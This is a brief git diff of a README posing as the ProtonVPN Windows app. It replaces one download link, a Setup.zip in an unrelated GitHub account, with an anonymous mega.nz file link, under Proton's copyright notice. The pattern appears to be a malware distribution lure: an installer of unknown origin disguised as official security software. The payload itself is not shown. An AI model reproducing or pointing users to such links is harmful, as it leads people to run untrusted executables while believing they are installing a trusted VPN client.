@@ -1,4 +1,4 @@
-# ProtonVPN Windows app - [DOWNLOAD](https://raw.githubusercontent.com/updaterd/setup-software/master/Setup.zip)
+# ProtonVPN Windows app - [DOWNLOAD](https://mega.nz/file/GmgDQAZL#GOKKgfLOPqFFqufNPAcpwBXE_yy6t5X6r0lpeBhDxwM)
 
 Copyright (c) 2020 Proton Technologies AG
 
